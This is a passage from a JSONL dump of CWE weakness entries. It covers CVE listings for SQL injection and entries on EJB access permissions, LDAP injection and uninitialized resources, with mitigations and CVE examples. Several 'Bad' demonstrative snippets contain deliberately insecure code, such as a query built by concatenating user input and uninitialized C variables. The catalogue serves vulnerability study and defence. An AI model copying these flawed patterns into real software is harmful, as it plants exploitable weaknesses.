An unauthenticated remote attacker can inject arbitrary SQL command to access, modify and delete database."}, {"Reference": "CVE-2022-39072", "Description": "There is a SQL injection vulnerability in Some ZTE Mobile Internet products. Due to insufficient validation of the input parameters of the SNTP interface, an authenticated attacker could use the vulnerability to execute stored XSS attacks."}, {"Reference": "CVE-2022-4427", "Description": "Improper Input Validation vulnerability in OTRS AG OTRS, OTRS AG ((OTRS)) Community Edition allows SQL Injection via TicketSearch Webservice This issue affects OTRS: from 7.0.1 before 7.0.40 Patch 1, from 8.0.1 before 8.0.28 Patch 1; ((OTRS)) Community Edition: from 6.0.1 through 6.0.34. "}, {"Reference": "CVE-2022-4557", "Description": "Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection') vulnerability in Group Arge Energy and Control Systems Smartpower Web allows SQL Injection.This issue affects Smartpower Web: before 23.01.01. "}, {"Reference": "CVE-2021-20016", "Description": "A SQL-Injection vulnerability in the SonicWall SSLVPN SMA100 product allows a remote unauthenticated attacker to perform SQL query to access username password and other session related information. This vulnerability impacts SMA100 build version 10.x."}, {"Reference": "CVE-2021-20028", "Description": "Improper neutralization of a SQL Command leading to SQL Injection vulnerability impacting end-of-life Secure Remote Access (SRA) products, specifically the SRA appliances running all 8.x firmware and 9.0.0.9-26sv or earlier"}, {"Reference": "CVE-2021-27101", "Description": "Accellion FTA 9_12_370 and earlier is affected by SQL injection via a crafted Host header in a request to document_root.html. The fixed version is FTA_9_12_380 and later."}, {"Reference": "CVE-2021-42258", "Description": "BQE BillQuick Web Suite 2018 through 2021 before 22.0.9.1 allows SQL injection for unauthenticated remote code execution, as exploited in the wild in October 2021 for ransomware installation. SQL injection can, for example, use the txtID (aka username) parameter. Successful exploitation can include the ability to execute arbitrary code as MSSQLSERVER$ via xp_cmdshell."}, {"Reference": "CVE-2021-35226", "Description": "An entity in Network Configuration Manager product is misconfigured and exposing password field to Solarwinds Information Service (SWIS). Exposed credentials are encrypted and require authenticated access with an NCM role. "}, {"Reference": "CVE-2022-46163", "Description": "Travel support program is a rails app to support the travel support program of openSUSE (TSP). Sensitive user data (bank account details, password Hash) can be extracted via Ransack query injection. Every deployment of travel-support-program below the patched version is affected. The travel-support-program uses the Ransack library to implement search functionality. In its default configuration, Ransack will allow for query conditions based on properties of associated database objects [1]. The `*_start`, `*_end` or `*_cont` search matchers [2] can then be abused to exfiltrate sensitive string values of associated database objects via character-by-character brute-force (A match is indicated by the returned JSON not being empty). A single bank account number can be extracted with <200 requests, a password hash can be extracted with ~1200 requests, all within a few minutes. The problem has been patched in commit d22916275c51500b4004933ff1b0a69bc807b2b7. In order to work around this issue, you can also cherry pick that patch, however it will not work without the Rails 5.0 migration that was done in #150, which in turn had quite a few pull requests it depended on."}, {"Reference": "CVE-2021-3958", "Description": "Improper Handling of Parameters vulnerability in Ipack Automation Systems Ipack SCADA Software allows : Blind SQL Injection.This issue affects Ipack SCADA Software: from unspecified before 1.1.0. "}, {"Reference": "CVE-2021-42760", "Description": "A improper neutralization of special elements used in an sql command ('sql injection') in Fortinet FortiWLM version 8.6.1 and below allows attacker to disclose sensitive information from DB tables via crafted requests."}, {"Reference": "CVE-2021-43077", "Description": "A improper neutralization of special elements used in an sql command ('sql injection') in Fortinet FortiWLM version 8.6.2 and below, version 8.5.2 and below, version 8.4.2 and below, version 8.3.2 and below allows attacker to execute unauthorized code or commands via crafted HTTP requests to the AP monitor handlers."}, {"Reference": "CVE-2021-43925", "Description": "Improper neutralization of special elements used in an SQL command ('SQL Injection') vulnerability in Log Management functionality in Synology DiskStation Manager (DSM) before 7.0.1-42218-2 allows remote attackers to inject SQL commands via unspecified vectors."}, {"Reference": "CVE-2021-43926", "Description": "Improper neutralization of special elements used in an SQL command ('SQL Injection') vulnerability in Log Management functionality in Synology DiskStation Manager (DSM) before 7.0.1-42218-2 allows remote attackers to inject SQL commands via unspecified vectors."}, {"Reference": "CVE-2021-43927", "Description": "Improper neutralization of special elements used in an SQL command ('SQL Injection') vulnerability in Security Management functionality in Synology DiskStation Manager (DSM) before 7.0.1-42218-2 allows remote attackers to inject SQL commands via unspecified vectors."}, {"Reference": "CVE-2022-0224", "Description": "dolibarr is vulnerable to Improper Neutralization of Special Elements used in an SQL Command"}, {"Reference": "CVE-2022-0258", "Description": "pimcore is vulnerable to Improper Neutralization of Special Elements used in an SQL Command"}, {"Reference": "CVE-2022-1358", "Description": "The affected On-Premise is vulnerable to data exfiltration through improper neutralization of special elements used in an SQL command. This could allow an attacker to exfiltrate and dump all data held in the cnMaestro database."}, {"Reference": "CVE-2022-1361", "Description": "The affected On-Premise cnMaestro is vulnerable to a pre-auth data exfiltration through improper neutralization of special elements used in an SQL command. This could allow an attacker to exfiltrate data about other user\u2019s accounts and devices."}, {"Reference": "CVE-2022-22280", "Description": "Improper Neutralization of Special Elements used in an SQL Command leading to Unauthenticated SQL Injection vulnerability, impacting SonicWall GMS 9.3.1-SP2-Hotfix1, Analytics On-Prem 2.5.0.3-2520 and earlier versions."}, {"Reference": "CVE-2022-2422", "Description": "Due to improper input validation in the Feathers js library, it is possible to perform a SQL injection attack on the back-end database, in case the feathers-sequelize package is used."}, {"Reference": "CVE-2022-35942", "Description": "Improper input validation on the `contains` LoopBack filter may allow for arbitrary SQL injection. When the extended filter property `contains` is permitted to be interpreted by the Postgres connector, it is possible to inject arbitrary SQL which may affect the confidentiality and integrity of data stored on the connected database. A patch was released in version 5.5.1. This affects users who does any of the following: - Connect to the database via the DataSource with `allowExtendedProperties: true` setting OR - Uses the connector's CRUD methods directly OR - Uses the connector's other methods to interpret the LoopBack filter. Users who are unable to upgrade should do the following if applicable: - Remove `allowExtendedProperties: true` DataSource setting - Add `allowExtendedProperties: false` DataSource setting - When passing directly to the connector functions, manually sanitize the user input for the `contains` LoopBack filter beforehand."}, {"Reference": "CVE-2022-45089", "Description": "Improper Input Validation vulnerability in Group Arge Energy and Control Systems Smartpower Web allows SQL Injection.This issue affects Smartpower Web: before 23.01.01. "}, {"Reference": "CVE-2022-45090", "Description": "Improper Input Validation vulnerability in Group Arge Energy and Control Systems Smartpower Web allows SQL Injection.This issue affects Smartpower Web: before 23.01.01. "}, {"Reference": "CVE-2022-3332", "Description": "A vulnerability classified as critical has been found in SourceCodester Food Ordering Management System. This affects an unknown part of the file router.php of the component POST Parameter Handler. The manipulation of the argument username leads to sql injection. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used. The associated identifier of this vulnerability is VDB-209583."}, {"Reference": "CVE-2022-3414", "Description": "A vulnerability was found in SourceCodester Web-Based Student Clearance System. It has been classified as critical. Affected is an unknown function of the file /Admin/login.php of the component POST Parameter Handler. The manipulation of the argument txtusername leads to sql injection. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used. VDB-210246 is the identifier assigned to this vulnerability."}, {"Reference": "CVE-2022-3467", "Description": "A vulnerability classified as critical was found in Jiusi OA. Affected by this vulnerability is an unknown functionality of the file /jsoa/hntdCustomDesktopActionContent. The manipulation of the argument inforid leads to sql injection. The exploit has been disclosed to the public and may be used. The identifier VDB-210709 was assigned to this vulnerability."}, {"Reference": "CVE-2022-3470", "Description": "A vulnerability was found in SourceCodester Human Resource Management System. It has been classified as critical. Affected is an unknown function of the file getstatecity.php. The manipulation of the argument sc leads to sql injection. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used. VDB-210714 is the identifier assigned to this vulnerability."}, {"Reference": "CVE-2022-3825", "Description": "A vulnerability was found in Huaxia ERP 2.3 and classified as critical. Affected by this issue is some unknown functionality of the component User Management. The manipulation of the argument login leads to sql injection. The attack may be launched remotely. The exploit has been disclosed to the public and may be used. The identifier of this vulnerability is VDB-212792."}, {"Reference": "CVE-2022-3827", "Description": "A vulnerability was found in centreon. It has been declared as critical. This vulnerability affects unknown code of the file formContactGroup.php of the component Contact Groups Form. The manipulation of the argument cg_id leads to sql injection. The attack can be initiated remotely. The name of the patch is 293b10628f7d9f83c6c82c78cf637cbe9b907369. It is recommended to apply a patch to fix this issue. VDB-212794 is the identifier assigned to this vulnerability."}, {"Reference": "CVE-2022-3868", "Description": "A vulnerability classified as critical has been found in SourceCodester Sanitization Management System. Affected is an unknown function of the file /php-sms/classes/Master.php?f=save_quote. The manipulation of the argument id leads to sql injection. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used. The identifier of this vulnerability is VDB-213012."}, {"Reference": "CVE-2022-3971", "Description": "A vulnerability was found in matrix-appservice-irc up to 0.35.1. It has been declared as critical. This vulnerability affects unknown code of the file src/datastore/postgres/PgDataStore.ts. The manipulation of the argument roomIds leads to sql injection. Upgrading to version 0.36.0 is able to address this issue. The name of the patch is 179313a37f06b298150edba3e2b0e5a73c1415e7. It is recommended to upgrade the affected component. VDB-213550 is the identifier assigned to this vulnerability."}, {"Reference": "CVE-2022-3972", "Description": "A vulnerability was found in Pingkon HMS-PHP. It has been rated as critical. This issue affects some unknown processing of the file admin/adminlogin.php. The manipulation of the argument uname/pass leads to sql injection. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used. The associated identifier of this vulnerability is VDB-213551."}, {"Reference": "CVE-2022-3973", "Description": "A vulnerability classified as critical has been found in Pingkon HMS-PHP. Affected is an unknown function of the file /admin/admin.php of the component Data Pump Metadata. The manipulation of the argument uname/pass leads to sql injection. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used. The identifier of this vulnerability is VDB-213552."}, {"Reference": "CVE-2022-3997", "Description": "A vulnerability, which was classified as critical, has been found in MonikaBrzica scm. Affected by this issue is some unknown functionality of the file upis_u_bazu.php. The manipulation of the argument email/lozinka/ime/id leads to sql injection. The attack may be launched remotely. The exploit has been disclosed to the public and may be used. VDB-213698 is the identifier assigned to this vulnerability."}, {"Reference": "CVE-2022-3998", "Description": "A vulnerability, which was classified as critical, was found in MonikaBrzica scm. This affects an unknown part of the file uredi_korisnika.php. The manipulation of the argument id leads to sql injection. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used. The associated identifier of this vulnerability is VDB-213699."}, {"Reference": "CVE-2022-4015", "Description": "A vulnerability, which was classified as critical, was found in Sports Club Management System 119. This affects an unknown part of the file admin/make_payments.php. The manipulation of the argument m_id/plan leads to sql injection. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used. The identifier VDB-213789 was assigned to this vulnerability."}, {"Reference": "CVE-2022-4247", "Description": "A vulnerability classified as critical was found in Movie Ticket Booking System. This vulnerability affects unknown code of the file booking.php. The manipulation of the argument id leads to sql injection. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used. The identifier of this vulnerability is VDB-214624."}, {"Reference": "CVE-2022-4248", "Description": "A vulnerability, which was classified as critical, has been found in Movie Ticket Booking System. This issue affects some unknown processing of the file editBooking.php. The manipulation of the argument id leads to sql injection. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used. The identifier VDB-214625 was assigned to this vulnerability."}, {"Reference": "CVE-2022-3471", "Description": "A vulnerability was found in SourceCodester Human Resource Management System. It has been declared as critical. Affected by this vulnerability is an unknown functionality of the file city.php. The manipulation of the argument searccity leads to sql injection. The attack can be launched remotely. The exploit has been disclosed to the public and may be used. The associated identifier of this vulnerability is VDB-210715."}, {"Reference": "CVE-2022-3472", "Description": "A vulnerability was found in SourceCodester Human Resource Management System. It has been rated as critical. Affected by this issue is some unknown functionality of the file city.php. The manipulation of the argument cityedit leads to sql injection. The attack may be launched remotely. The exploit has been disclosed to the public and may be used. The identifier of this vulnerability is VDB-210716."}, {"Reference": "CVE-2022-3473", "Description": "A vulnerability classified as critical has been found in SourceCodester Human Resource Management System. This affects an unknown part of the file getstatecity.php. The manipulation of the argument ci leads to sql injection. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used. The identifier VDB-210717 was assigned to this vulnerability."}, {"Reference": "CVE-2022-3579", "Description": "A vulnerability classified as critical was found in SourceCodester Cashier Queuing System 1.0. This vulnerability affects unknown code of the file /queuing/login.php of the component Login Page. The manipulation of the argument username/password leads to sql injection. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used. VDB-211186 is the identifier assigned to this vulnerability."}, {"Reference": "CVE-2022-3584", "Description": "A vulnerability was found in SourceCodester Canteen Management System 1.0. It has been rated as critical. This issue affects some unknown processing of the file edituser.php. The manipulation of the argument id leads to sql injection. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used. The identifier VDB-211193 was assigned to this vulnerability."}, {"Reference": "CVE-2022-3671", "Description": "A vulnerability classified as critical was found in SourceCodester eLearning System 1.0. This vulnerability affects unknown code of the file /admin/students/manage.php. The manipulation of the argument id leads to sql injection. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used. VDB-212014 is the identifier assigned to this vulnerability."}, {"Reference": "CVE-2022-3714", "Description": "A vulnerability classified as critical has been found in SourceCodester Online Medicine Ordering System 1.0. Affected is an unknown function of the file admin/?page=orders/view_order. The manipulation of the argument id leads to sql injection. It is possible to launch the attack remotely. VDB-212346 is the identifier assigned to this vulnerability."}, {"Reference": "CVE-2022-3729", "Description": "A vulnerability, which was classified as critical, has been found in seccome Ehoney. This issue affects some unknown processing of the file /api/v1/attack. The manipulation of the argument AttackIP leads to sql injection. The attack may be initiated remotely. The associated identifier of this vulnerability is VDB-212411."}, {"Reference": "CVE-2022-3730", "Description": "A vulnerability, which was classified as critical, was found in seccome Ehoney. Affected is an unknown function of the file /api/v1/attack/falco. The manipulation of the argument Payload leads to sql injection. It is possible to launch the attack remotely. The identifier of this vulnerability is VDB-212412."}, {"Reference": "CVE-2022-3731", "Description": "A vulnerability has been found in seccome Ehoney and classified as critical. Affected by this vulnerability is an unknown functionality of the file /api/v1/attack/token. The manipulation of the argument Payload leads to sql injection. The attack can be launched remotely. The identifier VDB-212413 was assigned to this vulnerability."}, {"Reference": "CVE-2022-3733", "Description": "A vulnerability was found in SourceCodester Web-Based Student Clearance System. It has been classified as critical. This affects an unknown part of the file Admin/edit-admin.php. The manipulation of the argument id leads to sql injection. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used. The associated identifier of this vulnerability is VDB-212415."}]}
{"ID": "9", "Name": "J2EE Misconfiguration: Weak Access Permissions for EJB Methods", "Abstraction": "Variant", "Structure": "Simple", "Status": "Draft", "Description": "If elevated access rights are assigned to EJB methods, then an attacker can take advantage of the permissions to exploit the product.", "ExtendedDescription": "If the EJB deployment descriptor contains one or more method permissions that grant access to the special ANYONE role, it indicates that access control for the application has not been fully thought through or that the application is structured in such a way that reasonable access control restrictions are impossible.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "266", "ViewID": "1000", "Ordinal": "Primary"}], "ModesOfIntroduction": [{"Phase": "Architecture and Design"}, {"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Other"]}], "PotentialMitigations": [{"Phase": ["Architecture and Design", "System Configuration"], "Description": "Follow the principle of least privilege when assigning access rights to EJB methods. Permission to invoke EJB methods should not be granted to the ANYONE role."}], "DemonstrativeExamples": [{"Entries": [{"IntroText": "The following deployment descriptor grants ANYONE permission to invoke the Employee EJB's method named getSalary()."}, {"Nature": "Bad", "Language": "XML", "ExampleCode": "```\n\t<ejb-jar>\n\t\t...\n\t\t<assembly-descriptor>\n\t\t\t<method-permission>\n\t\t\t\t<role-name>ANYONE</role-name>\n\t\t\t\t<method>\n\t\t\t\t<ejb-name>Employee</ejb-name>\n\t\t\t\t<method-name>getSalary</method-name>\n\t\t\t</method-permission>\n\t\t</assembly-descriptor>\n\t\t...\n\t</ejb-jar>\n```"}]}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "90", "Name": "Improper Neutralization of Special Elements used in an LDAP Query ('LDAP Injection')", "Abstraction": "Base", "Structure": "Simple", "Status": "Draft", "Description": "The product constructs all or part of an LDAP query using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended LDAP query when it is sent to a downstream component.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "943", "ViewID": "1000", "Ordinal": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}, {"Type": "Technology", "Name": "Database Server", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation", "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."}], "CommonConsequences": [{"Scope": ["Confidentiality", "Integrity", "Availability"], "Impact": ["Execute Unauthorized Code or Commands", "Read Application Data", "Modify Application Data"], "Note": "An attacker could include input that changes the LDAP query which allows unintended commands or code to be executed, allows sensitive data to be read or modified or causes other unintended behavior."}], "DetectionMethods": [{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "PotentialMitigations": [{"MitigationID": "MIT-5", "Phase": ["Implementation"], "Strategy": "Input Validation", "Description": "\n\nAssume all input is malicious. Use an \"accept known good\" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.\n\n\nWhen performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, \"boat\" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as \"red\" or \"blue.\"\n\n\nDo not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.\n"}], "DemonstrativeExamples": [{"ID": "DX-210", "Entries": [{"IntroText": "The code below constructs an LDAP query using user input address data:"}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tcontext = new InitialDirContext(env);\n\tString searchFilter = \"StreetAddress=\" + address;\n\tNamingEnumeration answer = context.search(searchBase, searchFilter, searchCtls);\n```"}, {"BodyText": "Because the code fails to neutralize the address string used to construct the query, an attacker can supply an address that includes additional LDAP queries."}]}], "ObservedExamples": [{"Reference": "CVE-2021-41232", "Description": "Chain: authentication routine in Go-based agile development product does not escape user name (CWE-116), allowing LDAP injection (CWE-90)", "Link": "https://www.cve.org/CVERecord?id=CVE-2021-41232"}, {"Reference": "CVE-2005-2301", "Description": "Server does not properly escape LDAP queries, which allows remote attackers to cause a DoS and possibly conduct an LDAP injection attack.", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-2301"}], "RelatedAttackPatterns": ["136"], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Notes": [{"Type": "Relationship", "Note": "Factors: resultant to special character mismanagement, MAID, or denylist/allowlist problems. Can be primary to authentication and verification errors."}], "Top25Examples": [{"Reference": "CVE-2022-22360", "Description": "IBM Sterling Partner Engagement Manager 6.1.2, 6.2, and Cloud/SasS 22.2 could allow a remote authenticated attacker to conduct an LDAP injection. By using a specially crafted request, an attacker could exploit this vulnerability and could result in in granting permission to unauthorized resources. IBM X-Force ID: 220782."}, {"Reference": "CVE-2022-45910", "Description": "Improper neutralization of special elements used in an LDAP query ('LDAP Injection') vulnerability in ActiveDirectory and Sharepoint ActiveDirectory authority connectors of Apache ManifoldCF allows an attacker to manipulate the LDAP search queries (DoS, additional queries, filter manipulation) during user lookup, if the username or the domain string are passed to the UserACLs servlet without validation. This issue affects Apache ManifoldCF version 2.23 and prior versions."}, {"Reference": "CVE-2022-24832", "Description": "GoCD is an open source a continuous delivery server. The bundled gocd-ldap-authentication-plugin included with the GoCD Server fails to correctly escape special characters when using the username to construct LDAP queries. While this does not directly allow arbitrary LDAP data exfiltration, it can allow an existing LDAP-authenticated GoCD user with malicious intent to construct and execute malicious queries, allowing them to deduce facts about other users or entries within the LDAP database (e.g alternate fields, usernames, hashed passwords etc) through brute force mechanisms. This only affects users who have a working LDAP authorization configuration enabled on their GoCD server, and only is exploitable by users authenticating using such an LDAP configuration. This issue has been fixed in GoCD 22.1.0, which is bundled with gocd-ldap-authentication-plugin v2.2.0-144."}, {"Reference": "CVE-2022-22975", "Description": "An issue was discovered in the Pinniped Supervisor with either LADPIdentityProvider or ActiveDirectoryIdentityProvider resources. An attack would involve the malicious user changing the common name (CN) of their user entry on the LDAP or AD server to include special characters, which could be used to perform LDAP query injection on the Supervisor's LDAP query which determines their Kubernetes group membership."}, {"Reference": "CVE-2022-31088", "Description": "LDAP Account Manager (LAM) is a webfrontend for managing entries (e.g. users, groups, DHCP settings) stored in an LDAP directory. In versions prior to 8.0 the user name field at login could be used to enumerate LDAP data. This is only the case for LDAP search configuration. This issue has been fixed in version 8.0."}]}
{"ID": "908", "Name": "Use of Uninitialized Resource", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The product uses or accesses a resource that has not been initialized.", "ExtendedDescription": "When a resource has not been properly initialized, the product may behave unexpectedly. This may lead to a crash or invalid memory access, but the consequences vary depending on the type of resource and how it is used within the product.", "LikelihoodOfExploit": "Medium", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "665", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "665", "ViewID": "1003", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Primary"}, {"Ordinality": "Resultant"}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Confidentiality"], "Impact": ["Read Memory", "Read Application Data"], "Note": "When reusing a resource such as memory or a program variable, the original contents of that resource may not be cleared before it is sent to an untrusted party."}, {"Scope": ["Availability"], "Impact": ["DoS: Crash, Exit, or Restart"], "Note": "The uninitialized resource may contain values that cause program flow to change in ways that the programmer did not intend."}], "PotentialMitigations": [{"Phase": ["Implementation"], "Description": "Explicitly initialize the resource before use. If this is performed through an API function or standard procedure, follow all required steps."}, {"Phase": ["Implementation"], "Description": "Pay close attention to complex conditionals that affect initialization, since some branches might not perform the initialization."}, {"Phase": ["Implementation"], "Description": "Avoid race conditions (CWE-362) during initialization routines."}, {"Phase": ["Build and Compilation"], "Description": "Run or compile the product with settings that generate warnings about uninitialized variables or data."}], "DemonstrativeExamples": [{"ID": "DX-105", "Entries": [{"IntroText": "Here, a boolean initiailized field is consulted to ensure that initialization tasks are only completed once. However, the field is mistakenly set to true during static initialization, so the initialization code is never reached."}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tprivate boolean initialized = true;\n\tpublic void someMethod() {\n\t\t\tif (!initialized) {\n```\n// perform initialization tasks* \n\t\t\t\t\t...\n\t\t\t\t\t\n\t\t\t\t\tinitialized = true;}"}]}, {"ID": "DX-54", "Entries": [{"IntroText": "The following code intends to limit certain operations to the administrator only."}, {"Nature": "Bad", "Language": "Perl", "ExampleCode": "```\n\t$username = GetCurrentUser();\n\t$state = GetStateData($username);\n\tif (defined($state)) {\n\t\t$uid = ExtractUserID($state);\n\t}\n```\n# do stuff* \n\tif ($uid == 0) {\n\t```\n\t\tDoAdminThings();\n\t}\n```"}, {"BodyText": "If the application is unable to extract the state information - say, due to a database timeout - then the $uid variable will not be explicitly set by the programmer. This will cause $uid to be regarded as equivalent to \"0\" in the conditional, allowing the original user to perform administrator actions. Even if the attacker cannot directly influence the state data, unexpected errors could cause incorrect privileges to be assigned to a user just by accident."}]}, {"ID": "DX-106", "Entries": [{"IntroText": "The following code intends to concatenate a string to a variable and print the string."}, {"Nature": "Bad", "Language": "C", "ExampleCode": "```\n\tchar str[20];\n\tstrcat(str, \"hello world\");\n\tprintf(\"%s\", str);\n```"}, {"BodyText": "This might seem innocent enough, but str was not initialized, so it contains random memory. As a result, str[0] might not contain the null terminator, so the copy might start at an offset other than 0. The consequences can vary, depending on the underlying memory."}, {"BodyText": "If a null terminator is found before str[8], then some bytes of random garbage will be printed before the \"hello world\" string. The memory might contain sensitive information from previous uses, such as a password (which might occur as a result of CWE-14 or CWE-244). In this example, it might not be a big deal, but consider what could happen if large amounts of memory are printed out before the null terminator is found."}, {"BodyText": "If a null terminator isn't found before str[8], then a buffer overflow could occur, since strcat will first look for the null terminator, then copy 12 bytes starting with that location. Alternately, a buffer over-read might occur (CWE-126) if a null terminator isn't found before the end of the memory segment is reached, leading to a segmentation fault and crash."}]}, {"ID": "DX-144", "Entries": [{"IntroText": "This example will leave test_string in an unknown condition when i is the same value as err_val, because test_string is not initialized (CWE-456). Depending on where this code segment appears (e.g. within a function body), test_string might be random if it is stored on the heap or stack. If the variable is declared in static memory, it might be zero or NULL. Compiler optimization might contribute to the unpredictability of this address."}, {"Nature": "Bad", "Language": "C", "ExampleCode": "char *test_string;\n if (i != err_val)\n {\n\n```\n\ttest_string = \"Hello World!\";\n }\n printf(\"%s\", test_string);\n```"}, {"BodyText": "When the printf() is reached, test_string might be an unexpected address, so the printf might print junk strings (CWE-457).\n\n\n To fix this code, there are a couple approaches to making sure that test_string has been properly set once it reaches the printf().\n\n\nOne solution would be to set test_string to an acceptable default before the conditional:"}, {"Nature": "Good", "Language": "C", "ExampleCode": "char *test_string = \"Done at the beginning\";\n if (i != err_val)\n {\n\n```\n\ttest_string = \"Hello World!\";\n }\n printf(\"%s\", test_string);\n```"}, {"BodyText": "Another solution is to ensure that each branch of the conditional - including the default/else branch - could ensure that test_string is set:"}, {"Nature": "Good", "Language": "C", "ExampleCode": "char *test_string;\n if (i != err_val)\n {\n\n```\n\ttest_string = \"Hello World!\";\n }\n else {\n\ttest_string = \"Done on the other side!\";\n }\n printf(\"%s\", test_string);\n```"}]}], "ObservedExamples": [{"Reference": "CVE-2019-9805", "Description": "Chain: Creation of the packet client occurs before initialization is complete (CWE-696) resulting in a read from uninitialized memory (CWE-908), causing memory corruption.", "Link": "https://www.cve.org/CVERecord?id=CVE-2019-9805"}, {"Reference": "CVE-2008-4197", "Description": "Use of uninitialized memory may allow code execution.", "Link": "https://www.cve.org/CVERecord?id=CVE-2008-4197"}, {"Reference": "CVE-2008-2934", "Description": "Free of an uninitialized pointer leads to crash and possible code execution.", "Link": "https://www.cve.org/CVERecord?id=CVE-2008-2934"}, {"Reference": "CVE-2008-0063", "Description": "Product does not clear memory contents when generating an error message, leading to information leak.", "Link": "https://www.cve.org/CVERecord?id=CVE-2008-0063"}, {"Reference": "CVE-2008-0062", "Description": "Lack of initialization triggers NULL pointer dereference or double-free.", "Link": "https://www.cve.org/CVERecord?id=CVE-2008-0062"}, {"Reference": "CVE-2008-0081", "Description": "Uninitialized variable leads to code execution in popular desktop application.", "Link": "https://www.cve.org/CVERecord?id=CVE-2008-0081"}, {"Reference": "CVE-2008-3688", "Description": "Chain: Uninitialized variable leads to infinite loop.", "Link": "https://www.cve.org/CVERecord?id=CVE-2008-3688"}, {"Reference": "CVE-2008-3475", "Description": "Chain: Improper initialization leads to memory corruption.", "Link": "https://www.cve.org/CVERecord?id=CVE-2008-3475"}, {"Reference": "CVE-2005-1036", "Description": "Chain: Bypass of access restrictions due to improper authorization (CWE-862) of a user results from an improperly initialized (CWE-909) I/O permission bitmap", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-1036"}, {"Reference": "CVE-2008-3597", "Description": "Chain: game server can access player data structures before initialization has happened leading to NULL dereference", "Link": "https://www.cve.org/CVERecord?id=CVE-2008-3597"}, {"Reference": "CVE-2009-2692", "Description": "Chain: uninitialized function pointers can be dereferenced allowing code execution", "Link": "https://www.cve.org/CVERecord?id=CVE-2009-2692"}, {"Reference": "CVE-2009-0949", "Description": "Chain: improper initialization of memory can lead to NULL dereference", "Link": "https://www.cve.org/CVERecord?id=CVE-2009-0949"}, {"Reference": "CVE-2009-3620", "Description": "Chain: some unprivileged ioctls do not verify that a structure has been initialized before invocation, leading to NULL dereference", "Link": "https://www.cve.org/CVERecord?id=CVE-2009-3620"}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Top25Examples": [{"Reference": "CVE-2021-32845", "Description": "HyperKit is a toolkit for embedding hypervisor capabilities in an application. In versions 0.20210107 and prior of HyperKit, the implementation of `qnotify` at `pci_vtrnd_notify` fails to check the return value of `vq_getchain`. This leads to `struct iovec iov;` being uninitialized and used to read memory in `len = (int) read(sc->vrsc_fd, iov.iov_base, iov.iov_len);` when an attacker is able to make `vq_getchain` fail. This issue may lead to a guest crashing the host causing a denial of service and, under certain circumstance, memory corruption. This issue is fixed in commit 41272a980197917df8e58ff90642d14dec8fe948."}, {"Reference": "CVE-2021-39671", "Description": "In code generated by aidl_const_expressions.cpp, there is a possible out of bounds read due to uninitialized data. This could lead to information disclosure with no additional execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-12Android ID: 